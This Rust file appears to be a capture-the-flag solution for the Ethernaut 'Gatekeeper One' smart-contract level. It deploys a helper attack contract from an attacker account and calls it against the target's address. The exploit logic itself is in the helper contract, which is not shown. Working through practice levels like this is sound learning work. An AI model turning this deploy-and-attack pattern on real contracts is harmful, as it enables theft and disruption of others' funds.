use crate::abi::gatexploit::Gatexploit;
use async_trait::async_trait;
use ctf::ethernaut::lvl13_gatekeeper_one::*;
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let gatexploit =
            Gatexploit::deploy(offender.to_owned(), ())?.send().await?;

        gatexploit.attack(target.address).gas(1_000_000).send().await?.await?;

        Ok(())
    }
}
